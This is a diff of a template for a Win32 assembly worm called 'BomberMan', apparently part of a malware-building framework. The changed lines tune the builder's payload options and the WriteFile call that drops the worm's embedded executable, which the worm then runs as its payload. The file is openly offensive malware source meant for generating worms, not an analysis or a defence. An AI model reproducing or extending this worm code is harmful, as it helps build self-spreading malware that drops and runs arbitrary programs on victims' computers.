@@ -1,6 +1,6 @@
 #!name##BomberMan
 #!types##worm
-#!info##A worm programmed in assembler. As a payload, it runs in a separate process another binary file which it places inside itself.
+#!info##A worm programmed in assembler (win32). As a payload, it runs in a separate process another binary file which it places inside itself.
 #!lang##asm
 #!banned##module##starter##shadow##junk
 #!globalVar##OS_EXEC##win##Target system executable
@@ -8,8 +8,9 @@
 #!system_FLAG##[W]
 #!processWorm##BasicAsm
 #!reqPayload##BM_exe##Executable binary data.
-#!payloadOpt##BM_exe##ENCODE##convert_bytes##convert_bytes
-#!reqVar##EXE_LEN##The number of bytes to transfer. You don't need to set this variable, it is automatically set.
+#!areqVar##EXE_LEN##The number of bytes to transfer. You don't need to set this variable, it is automatically set.
+#!payStep##add_var
+#!payloadOpt##BM_exe##add_var_bin_len##exe_len
 
 %define Error_invalid_generic 0xFFFFFFFF
 %define Generic_all_FLAG 0x10000000
@@ -99,7 +100,7 @@ section .text
         
         push 0
         push bytes_write
-        push {{EXE_LEN}}
+        push {{exe_len}}
         push bin_data
         push dword [fhandler]
         call _WriteFile@20
